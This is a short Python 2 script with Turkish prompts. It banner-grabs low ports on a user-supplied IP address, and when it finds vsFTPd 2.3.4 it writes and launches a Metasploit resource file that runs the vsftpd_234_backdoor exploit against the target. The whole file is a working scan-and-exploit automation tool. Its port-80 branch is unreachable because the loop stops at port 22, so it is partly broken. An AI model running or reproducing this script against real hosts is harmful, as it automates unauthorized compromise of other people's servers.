#!/usr/bin/env python

import subprocess
import socket
import sys
import requests
subprocess.call('clear',shell=True)

IP=raw_input("IP adresi:  ")
print "\n"
print "    Port","   Service"
print ("-"*50)
banner_list=[]
for i in range(23):	
	try:
		if i == 80:	
			x= "http://IP:i"
			x=x.replace("IP",IP)
			x=x.replace("i",str(i))	
			req=requests.get(x)
			print "[+] ",i,"   ",req.headers['Server']
		else:
		
			sock=socket.socket()
			sock.connect((IP,i))
			banner=str(sock.recv(1024)).splitlines()[0]
			print "[+] ",i,"   ",banner
			banner_list.append(banner)
			sock.close()
	except:
		pass

for i in banner_list:
	print ("-"*50)
	if "vsFTPd 2.3.4" in i:
		rc="""use exploit/unix/ftp/vsftpd_234_backdoor 
		set RHOST ip 
		set RPORT port 
		exploit"""
		rc=rc.replace("ip",IP)
		rc=rc.replace("port",str(21))
		path=subprocess.check_output("pwd",shell=True).splitlines()[0]
		path=path+"/vsFTPd2-3-4.rc"
		print i," Exploit ediliyor..."
		dosya=open(path,"w")
		dosya.write(rc)
		dosya.close()
		komut="xterm -e msfconsole -r "+str(path)
		subprocess.Popen(komut,shell=True,stdout=subprocess.PIPE)
	else:
		print i," Exploit edilemedi"
    


